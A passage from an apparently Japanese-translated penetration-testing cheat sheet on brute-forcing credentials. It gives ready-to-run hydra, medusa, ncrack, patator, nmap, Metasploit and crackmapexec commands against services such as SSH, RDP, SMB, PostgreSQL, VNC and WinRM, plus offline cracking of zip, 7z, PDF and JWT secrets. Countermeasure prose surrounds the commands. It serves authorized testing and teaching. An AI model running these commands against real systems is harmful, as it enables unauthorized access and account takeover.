msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
**oracle_login**を**patator**と一緒に使用するためには、以下の手順で**インストール**する必要があります:
```bash
pip3 install cx_Oracle --upgrade
```
[オフラインOracleSQLハッシュブルートフォース](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**バージョン11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2**、および**11.2.0.3**)：
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
Brute force is a common method used in hacking to gain unauthorized access to a system or account by systematically trying all possible combinations of passwords until the correct one is found. This method is often used when there is no other known vulnerability or weakness in the system's security.

Brute force attacks can be time-consuming and resource-intensive, especially if the password being targeted is long and complex. However, with the help of powerful computers and specialized software, hackers can automate the process and significantly speed up the attack.

To protect against brute force attacks, it is important to use strong and unique passwords that are not easily guessable. Additionally, implementing account lockout policies, which temporarily lock an account after a certain number of failed login attempts, can also help mitigate the risk of brute force attacks.

It is worth noting that brute force attacks are illegal and unethical. Engaging in such activities without proper authorization is a criminal offense and can result in severe penalties.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQLはオープンソースのリレーショナルデータベース管理システムです。ブルートフォース攻撃は、PostgreSQLデータベースに対して非常に効果的な攻撃手法の1つです。ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードや認証情報を推測するために、すべての可能な組み合わせを試行する方法です。

ブルートフォース攻撃は、通常、辞書攻撃と組み合わせて使用されます。辞書攻撃では、一般的なパスワードや単語のリストを使用して、攻撃対象のデータベースに対して試行します。ブルートフォース攻撃は、辞書攻撃が成功しなかった場合に使用され、すべての可能な組み合わせを試すことで、パスワードを特定します。

ブルートフォース攻撃は非常に時間がかかる場合がありますが、十分な計算リソースと時間があれば、成功する可能性があります。攻撃者は、高速なハードウェアやクラウドプロバイダーのリソースを利用して、ブルートフォース攻撃を実行することができます。

PostgreSQLデータベースをブルートフォース攻撃から保護するためには、強力なパスワードポリシーを実装し、パスワードの長さと複雑さを増やすことが重要です。また、アカウントロックアウト機能やIP制限などのセキュリティメカニズムを使用することも推奨されます。

ブルートフォース攻撃は、PostgreSQLデータベースのセキュリティを脅かす可能性があるため、適切な対策を講じることが重要です。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)から`.deb`パッケージをダウンロードしてインストールすることができます。
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
## RDP

RDP (Remote Desktop Protocol) is a proprietary protocol developed by Microsoft that allows users to remotely access and control a computer over a network. It is commonly used for remote administration and remote support purposes.

### Brute Force Attack on RDP

A brute force attack on RDP involves systematically trying all possible combinations of usernames and passwords until the correct credentials are found. This is done by using automated tools that can rapidly attempt multiple login attempts.

#### Methodology

1. **Enumeration**: Gather information about the target RDP server, such as the IP address, port number, and available usernames.
2. **Password List**: Create or obtain a password list that contains commonly used passwords, leaked passwords, or passwords specific to the target organization.
3. **Brute Force Tool**: Use a brute force tool, such as Hydra or Medusa, to automate the login attempts using the obtained username list and password list.
4. **Configure Tool**: Set the tool to target the RDP protocol and specify the IP address and port number of the target server.
5. **Launch Attack**: Start the brute force attack and let the tool systematically try all possible combinations of usernames and passwords.
6. **Monitor Progress**: Monitor the tool's progress and check for any successful login attempts.
7. **Post-Attack**: Once the attack is complete, analyze the results and report any successful login credentials.

#### Countermeasures

To protect against brute force attacks on RDP, consider implementing the following countermeasures:

- **Strong Passwords**: Enforce the use of strong, complex passwords that are resistant to brute force attacks.
- **Account Lockout Policy**: Implement an account lockout policy that locks out user accounts after a certain number of failed login attempts.
- **Network Segmentation**: Separate the RDP server from the rest of the network to limit the attack surface.
- **Two-Factor Authentication**: Implement two-factor authentication to add an extra layer of security to the RDP login process.
- **IP Whitelisting**: Restrict RDP access to specific IP addresses or ranges to limit unauthorized access.
- **Monitoring and Alerting**: Implement monitoring and alerting systems to detect and respond to brute force attacks in real-time.

By following these countermeasures, you can significantly reduce the risk of a successful brute force attack on RDP.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
# Redis

Redis（Remote Dictionary Server）は、高速でオープンソースのキーバリューストアです。Redisは、メモリ内でデータを保持するため、高速な読み書きアクセスが可能です。また、データの永続化もサポートしています。

## ブルートフォース攻撃

ブルートフォース攻撃は、暗号化されたデータやパスワードを解読するために使用される一般的な攻撃手法です。この攻撃では、すべての可能な組み合わせを試行し、正しい組み合わせを見つけるまで続けます。

Redisに対するブルートフォース攻撃では、一連のパスワードを試行し、正しいパスワードを見つけることを目指します。攻撃者は、一般的なパスワードや辞書攻撃を使用して、パスワードを推測します。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、パスワードの複雑さを確保する必要があります。また、アカウントロックアウトやログイン試行回数の制限などのセキュリティメカニズムを使用することも重要です。

## 対策方法

以下は、Redisに対するブルートフォース攻撃からデータを保護するための対策方法です。

- 強力なパスワードポリシーを実装する。パスワードは長く、複雑な文字列である必要があります。
- パスワードの定期的な変更を促す。
- アカウントロックアウト機能を有効にし、一定回数のログイン試行が失敗した場合にアカウントをロックする。
- ログイン試行回数の制限を設定する。
- IPアドレスベースのアクセス制御リストを使用して、不正なアクセスをブロックする。
- ネットワークトラフィックの監視と異常なアクティビティの検出を行う。
- Redisのセキュリティパッチを定期的に適用する。

これらの対策を実施することで、Redisに対するブルートフォース攻撃からデータを保護することができます。
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Rexec is a remote execution service that allows users to execute commands on a remote system. It is commonly used for administrative purposes, such as managing multiple servers or performing system maintenance tasks.

One common method of brute-forcing Rexec is by attempting to guess the username and password combination. This can be done by using a list of commonly used usernames and passwords, or by generating a list of possible combinations based on known information about the target system.

Another approach is to use a tool like Hydra, which is specifically designed for brute-forcing various protocols, including Rexec. Hydra allows you to specify a list of usernames and passwords, and it will automatically try each combination until it finds a successful login.

It is important to note that brute-forcing Rexec or any other service is generally considered unethical and illegal without proper authorization. It is recommended to only use these techniques in a controlled environment, such as during a penetration testing engagement, with the explicit permission of the target system owner.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin is a remote login protocol that allows users to log into a remote system over a network. It is commonly used in Unix-based systems. 

Brute forcing Rlogin involves systematically trying different username and password combinations until the correct credentials are found. This can be done using automated tools or scripts that iterate through a list of common usernames and passwords. 

It is important to note that brute forcing is an aggressive and potentially illegal hacking technique. It is recommended to only use this technique with proper authorization and for legitimate purposes, such as penetration testing.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) is a network protocol that allows users to execute commands on a remote system. It is commonly used for remote administration tasks. However, it is important to note that Rsh is considered insecure due to its lack of encryption and authentication mechanisms.

One common brute-force attack method against Rsh is to systematically try different username and password combinations until a successful login is achieved. This can be done using automated tools such as Hydra or Medusa.

To protect against brute-force attacks on Rsh, it is recommended to disable or restrict access to the Rsh service. Additionally, implementing strong authentication mechanisms, such as using SSH (Secure Shell) instead of Rsh, is highly recommended.

Remember, always obtain proper authorization before attempting any hacking techniques. Hacking without permission is illegal and unethical.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsyncは、ファイル転送と同期のための強力なツールです。このツールは、ローカルマシンとリモートマシン間でファイルを転送するために使用されます。Rsyncは、ファイルの差分を計算し、変更された部分のみを転送することができます。これにより、転送時間と帯域幅を節約することができます。

Rsyncは、SSHプロトコルを使用してファイルを転送するため、セキュリティが確保されています。また、転送中に途中でエラーが発生した場合でも、再開することができます。

Rsyncは、以下のようなコマンドで使用することができます。

```
rsync [オプション] <ソース> <宛先>
```

オプションには、転送の方法や動作を指定するためのさまざまなフラグがあります。詳細な情報は、Rsyncのドキュメントを参照してください。

Rsyncは、ファイルのバックアップや同期、リモートサーバーへのファイルのアップロードなど、さまざまなシナリオで使用されます。
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP（Real-Time Streaming Protocol）は、ストリーミングメディアを配信するためのプロトコルです。RTSPは、クライアントとサーバー間でのメディアの制御や転送を可能にします。このプロトコルは、リアルタイムのビデオやオーディオのストリームを効率的に配信するために使用されます。

RTSPの攻撃手法の一つに、ブルートフォース攻撃があります。ブルートフォース攻撃は、パスワードや認証情報を推測するために、総当たりで可能なすべての組み合わせを試す手法です。この攻撃手法は、弱いパスワードやデフォルトの認証情報を使用している場合に特に有効です。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを採用し、デフォルトの認証情報を変更することが重要です。また、アカウントロックアウトやログイン試行回数の制限などのセキュリティ対策も有効です。

RTSPのセキュリティを向上させるためには、暗号化や認証の実装、アクセス制御の設定などが必要です。また、セキュリティパッチやアップデートの適用も重要です。セキュリティの脆弱性が発見された場合は、速やかに修正する必要があります。

RTSPのセキュリティに関する情報やツールは、オンラインで入手可能です。セキュリティコミュニティや専門のフォーラムを活用して、最新の情報やベストプラクティスを学ぶことが重要です。
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

SNMP（Simple Network Management Protocol）は、ネットワークデバイスの管理と監視に使用されるプロトコルです。SNMPは、ネットワーク上のデバイスの情報を収集し、設定を変更するために使用されます。SNMPは、エージェントとマネージャの間で情報をやり取りするために使用されます。

SNMPは、デバイスの情報を取得するために、ブルートフォース攻撃に使用されることがあります。ブルートフォース攻撃では、辞書やパスワードリストを使用して、デバイスのコミュニティストリング（SNMPの認証情報）を推測しようとします。推測に成功すれば、攻撃者はデバイスにアクセスし、情報を取得したり、設定を変更したりすることができます。

ブルートフォース攻撃は、効果的な攻撃手法の1つですが、デバイスが強力なパスワードポリシーを使用している場合や、攻撃者が十分な時間とリソースを持っていない場合には成功しづらいです。したがって、セキュリティを強化するためには、強力なパスワードポリシーの使用や、SNMPのセキュリティ設定の適切な構成が重要です。
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB（Server Message Block）は、ネットワーク上でファイル共有やリソース共有を行うためのプロトコルです。SMBは、Windowsオペレーティングシステムで広く使用されており、ファイルやプリンターなどのリソースをネットワーク上で共有するための機能を提供します。

SMBのブルートフォース攻撃は、辞書攻撃の一種であり、ユーザー名とパスワードの組み合わせを総当たりで試行し、正しい認証情報を見つけることを目指します。この攻撃は、弱いパスワードを使用しているユーザーアカウントを特定するために使用されます。

ブルートフォース攻撃は、自動化ツールを使用して実行することができます。これにより、大量のユーザー名とパスワードの組み合わせを高速で試行することができます。攻撃者は、一般的なパスワードや辞書攻撃によって成功する可能性が高いパスワードを事前に選定することもあります。

SMBのブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実施し、パスワードの複雑さを強化することが重要です。また、アカウントロックアウトポリシーを設定することで、一定回数の認証失敗後にアカウントをロックすることも有効です。さらに、ネットワーク上のSMBサーバーへのアクセスを制限することも推奨されます。
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
SMTP（Simple Mail Transfer Protocol）は、電子メールの送信に使用されるプロトコルです。SMTPサーバーに接続し、メールを送信するために使用されます。SMTPは、メールアドレスの確認やメールの送信制限などのセキュリティ機能を提供します。SMTPサーバーへのアクセスを不正に取得することで、攻撃者はスパムメールの送信やフィッシング詐欺の実行など、悪意のある活動を行うことができます。

SMTPサーバーへの不正アクセスを試みる際に使用される一般的な手法の1つは、ブルートフォース攻撃です。ブルートフォース攻撃では、攻撃者は可能なすべてのパスワードの組み合わせを試し、正しいパスワードを見つけることを目指します。これにより、攻撃者はSMTPサーバーにログインし、不正なメールの送信を行うことができます。

ブルートフォース攻撃を実行するためには、辞書攻撃や総当たり攻撃などの手法を使用することがあります。辞書攻撃では、事前に作成されたパスワードリストを使用して攻撃を行います。総当たり攻撃では、すべての可能な文字の組み合わせを試してパスワードを推測します。

ブルートフォース攻撃は非常に時間がかかる場合がありますが、強力なパスワードを使用していない場合には成功する可能性があります。したがって、セキュリティを強化するためには、強力なパスワードポリシーを採用し、アカウントロックアウトやCAPTCHAなどの追加のセキュリティメカニズムを実装することが重要です。
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
SOCKSは、ネットワークプロトコルであり、プロキシサーバーを介してTCP/IP接続を確立するために使用されます。 SOCKSプロトコルは、クライアントとサーバーの間でデータを中継するために使用され、ユーザーのIPアドレスを隠すことができます。 SOCKSプロトコルは、ネットワークセキュリティや匿名性を向上させるために、ハッカーによって悪用されることもあります。

ハッカーは、ブルートフォース攻撃を使用して、パスワードや認証情報を推測することができます。ブルートフォース攻撃は、すべての可能な組み合わせを試し、正しいパスワードを見つけるまで続ける方法です。ハッカーは、高速なコンピュータやクラウドプラットフォームを使用して、大量のパスワードを試すことができます。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、パスワードの長さと複雑さを増やす必要があります。また、アカウントロックアウトやCAPTCHAなどのセキュリティメカニズムを使用することも有効です。さらに、2要素認証やバイオメトリクス認証などの追加の認証レベルを実装することも推奨されます。

ハッカーはまた、辞書攻撃と呼ばれる別のブルートフォース攻撃手法を使用することもあります。辞書攻撃では、一般的なパスワードや単語のリストを使用して、パスワードを推測します。これを防ぐためには、パスワードポリシーを強化し、辞書攻撃に使用される可能性のある単語やフレーズを避ける必要があります。

ブルートフォース攻撃は、セキュリティテストやペネトレーションテストの一環として使用されることもあります。これにより、システムの脆弱性を特定し、セキュリティ対策を強化することができます。ただし、許可なくブルートフォース攻撃を実行することは違法ですので、適切な許可を得る必要があります。
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH（Secure Shell）は、ネットワーク上で安全なリモートアクセスを提供するプロトコルです。SSHを使用すると、暗号化されたトンネルを介してリモートサーバーに接続し、コマンドを実行したりファイルを転送したりすることができます。

SSHのブルートフォース攻撃は、辞書攻撃とも呼ばれ、SSHサーバーへの不正アクセスを試みる手法です。攻撃者は、一連のパスワードを試し、正しいパスワードを見つけることを目指します。

SSHブルートフォース攻撃を防ぐためには、以下の対策を講じることが重要です。

- 強力なパスワードポリシーを実施する：長さ、複雑さ、一意性の要件を設定し、定期的なパスワード変更を促す。
- ログイン試行回数の制限：一定の時間内に許可されるログイン試行回数を制限する。
- パスワード認証の無効化：公開鍵認証を使用してSSH接続を設定し、パスワード認証を無効にする。
- ファイアウォールの設定：SSHポートへのアクセスを制限するために、ファイアウォールを使用する。

これらの対策を実施することで、SSHブルートフォース攻撃からシステムを保護することができます。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### 弱いSSHキー/Debianの予測可能なPRNG

一部のシステムでは、暗号化素材を生成するために使用されるランダムシードに既知の欠陥があります。これにより、キースペースが劇的に減少し、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)などのツールでブルートフォース攻撃が可能になります。また、[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)のような弱いキーの事前生成セットも利用可能です。

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

Telnetは、ネットワーク上のリモートコンピュータに接続するためのプロトコルです。このプロトコルを使用すると、リモートコンピュータにログインして、コマンドを実行したり、ファイルを転送したりすることができます。

Telnetは、ユーザー名とパスワードを使用してリモートコンピュータにログインするため、認証情報の推測に使用することができます。これは、ブルートフォース攻撃の一形態です。

ブルートフォース攻撃では、すべての可能な組み合わせのユーザー名とパスワードを試行し、正しい認証情報を見つけることを目指します。これにより、不正アクセスを試みることができます。

Telnetのブルートフォース攻撃を実行するためには、ツールやスクリプトを使用することができます。これらのツールは、自動的にユーザー名とパスワードの組み合わせを試行し、正しい認証情報を見つけることができます。

ただし、Telnetはセキュリティ上のリスクがあるため、推奨されません。代わりに、より安全なプロトコルであるSSHを使用することをお勧めします。SSHは、暗号化された接続を提供し、セキュリティを向上させます。

Telnetのブルートフォース攻撃は、合法的な目的のために使用される場合もあります。たとえば、セキュリティテストやペネトレーションテストでは、システムの脆弱性を特定するためにブルートフォース攻撃が使用されることがあります。ただし、これらの活動は合法的な許可を得て行われるべきです。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC（Virtual Network Computing）は、リモートデスクトッププロトコル（RDP）の一種であり、リモートマシンへのアクセスを提供するために使用されます。VNCは、クライアントとサーバーの間でデスクトップ画面の情報を送受信することによって動作します。

VNCのブルートフォース攻撃は、パスワードの推測を行い、正しいパスワードを見つけることを目指します。この攻撃は、一般的なパスワードリストを使用して自動化されることが多く、多くの試行とエラーが行われます。

VNCのブルートフォース攻撃を実行するためには、ブルートフォースツールを使用する必要があります。一般的なツールには、Hydra、Medusa、Ncrackなどがあります。これらのツールは、複数の接続を同時に試行し、パスワードを推測するためのさまざまな方法を提供します。

VNCのブルートフォース攻撃は、セキュリティ上の脆弱性を悪用するため、合法的な目的でのみ使用することが重要です。また、攻撃を実行する前に、適切な許可を得る必要があります。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrmは、Windowsリモート管理（WinRM）プロトコルを使用して、リモートでWindowsマシンを管理するためのサービスです。WinRMは、Windows PowerShellや他のリモート管理ツールを使用して、リモートマシンにコマンドを実行したり、設定を変更したりするために使用されます。

Winrmは、デフォルトで有効になっている場合がありますが、一部のセキュリティ設定によって無効にされている場合もあります。Winrmを使用してリモートマシンにアクセスするためには、Winrmサービスが実行されていることを確認し、必要に応じて設定を変更する必要があります。

Winrmを使用した攻撃は、ブルートフォース攻撃が一般的です。ブルートフォース攻撃では、辞書攻撃や総当たり攻撃などの手法を使用して、パスワードを推測し、正しいパスワードを見つけることを試みます。Winrmに対するブルートフォース攻撃は、弱いパスワードを使用している場合に特に有効です。

Winrmへのブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、アカウントロックアウトポリシーを設定することが重要です。また、Winrmサービスへのアクセスを制限するために、ファイアウォールやネットワークセキュリティグループを使用することも推奨されます。

Winrmのセキュリティを向上させるためには、マルチファクタ認証を使用することも検討してください。マルチファクタ認証は、パスワードだけでなく、追加の認証要素（例：ワンタイムパスワード、生体認証）を必要とするため、セキュリティを強化する効果があります。

Winrmのセキュリティを確保するためには、定期的なパスワード変更やセキュリティパッチの適用も重要です。また、ログイン試行の監視や異常なアクティビティの検出にも注意を払う必要があります。

Winrmを使用する際には、セキュリティの重要性を認識し、適切な対策を講じることが不可欠です。
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフロー**を簡単に構築し、自動化することができます。\
今すぐアクセスを取得してください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ローカル

### オンラインクラッキングデータベース

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (ハッシュ、WPA2キャプチャ、およびMSOffice、ZIP、PDFのアーカイブ...)
* [https://crackstation.net/](https://crackstation.net) (ハッシュ)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (ハッシュとファイルハッシュ)
* [https://hashes.org/search.php](https://hashes.org/search.php) (ハッシュ)
* [https://www.cmd5.org/](https://www.cmd5.org) (ハッシュ)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5、NTLM、SHA1、MySQL5、SHA256、SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

ハッシュをブルートフォース攻撃する前に、これをチェックしてください。

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### 既知の平文zip攻撃

暗号化されたzip内のファイルの**平文**（または平文の一部）を知る必要があります。暗号化されたzip内のファイルの**ファイル名とサイズを確認**するには、**`7z l encrypted.zip`**を実行します。\
[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)をリリースページからダウンロードしてください。
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7zは、高い圧縮率を持つオープンソースのファイルアーカイバです。7zファイルは、他の一般的なアーカイブ形式（zip、tar、gzipなど）よりも小さくなる傾向があります。

7zファイルのパスワードを解読するために、ブルートフォース攻撃を使用することができます。ブルートフォース攻撃は、すべての可能なパスワードの組み合わせを試すことで、正しいパスワードを見つける手法です。

ブルートフォース攻撃は、非常に時間がかかる場合があります。しかし、パスワードが弱い場合や、十分なリソースを持つ場合には、成功する可能性があります。

以下は、7zファイルのブルートフォース攻撃の手順です。

1. ブルートフォース攻撃ツールを選択します。一般的なツールには、John the RipperやHashcatなどがあります。

2. ツールを設定し、7zファイルのパスワードを解読するためのパラメータを指定します。これには、使用する文字セット、パスワードの最小長と最大長、および他のオプションが含まれます。

3. ブルートフォース攻撃を開始します。ツールは、指定されたパラメータに基づいて、すべての可能なパスワードの組み合わせを試します。

4. 正しいパスワードが見つかるまで、攻撃を続けます。これには、時間がかかる場合があります。

5. パスワードが見つかったら、7zファイルを解凍して中身を確認します。

ブルートフォース攻撃は、合法的な目的でのみ使用することが重要です。他人のプライバシーを侵害したり、不正なアクセスを試みたりしないように注意してください。
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
## PDF

Brute force attacks can also be used to crack passwords for PDF files. PDF files are commonly used for storing sensitive information, so being able to crack the password can be valuable for an attacker.

To perform a brute force attack on a PDF file, you will need a tool that can automate the process of trying different passwords until the correct one is found. One such tool is called "pdfcrack".

Pdfcrack is a command-line tool that can be used to crack the password of a PDF file. It works by trying different combinations of passwords until the correct one is found. Pdfcrack supports both dictionary-based attacks and brute force attacks.

To use pdfcrack, you will need to provide it with the path to the PDF file and specify the type of attack you want to perform. For example, to perform a brute force attack, you can use the following command:

```
pdfcrack -b -f path/to/file.pdf
```

This command tells pdfcrack to perform a brute force attack (`-b`) on the specified PDF file (`-f`). Pdfcrack will then start trying different combinations of passwords until the correct one is found.

Keep in mind that brute force attacks can be time-consuming, especially if the password is long and complex. It is also worth noting that cracking passwords for PDF files may be illegal in some jurisdictions, so make sure you have the necessary permissions before attempting such an attack.

---

## PDF（PDFファイル）

PDFファイルのパスワードを解読するためにも、ブルートフォース攻撃を使用することができます。PDFファイルは、機密情報を保存するためによく使用されるため、パスワードを解読できると攻撃者にとって有益です。

PDFファイルに対するブルートフォース攻撃を実行するには、異なるパスワードを試すプロセスを自動化できるツールが必要です。そのようなツールの1つが「pdfcrack」です。

Pdfcrackは、PDFファイルのパスワードを解読するために使用できるコマンドラインツールです。正しいパスワードが見つかるまで、異なるパスワードの組み合わせを試します。Pdfcrackは、辞書攻撃とブルートフォース攻撃の両方をサポートしています。

Pdfcrackを使用するには、PDFファイルへのパスを指定し、実行する攻撃のタイプを指定する必要があります。たとえば、ブルートフォース攻撃を実行するには、次のコマンドを使用できます。

```
pdfcrack -b -f path/to/file.pdf
```

このコマンドは、pdfcrackに指定されたPDFファイル（`-f`）に対してブルートフォース攻撃（`-b`）を実行するように指示します。pdfcrackは、正しいパスワードが見つかるまで、異なるパスワードの組み合わせを試し続けます。

ブルートフォース攻撃は、パスワードが長く複雑な場合には時間がかかる場合があります。また、PDFファイルのパスワードを解読することは、一部の管轄区域では違法である可能性があるため、そのような攻撃を試みる前に必要な権限を持っていることを確認してください。
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDFオーナーパスワード

PDFオーナーパスワードをクラックするには、次を確認してください：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM クラッキング

NTLM クラッキングは、Windows ベースのシステムで使用される認証プロトコルである NTLM のパスワードを解読する手法です。NTLM ハッシュを取得するために、パスワードの推測や辞書攻撃、ブルートフォース攻撃などの手法が使用されます。

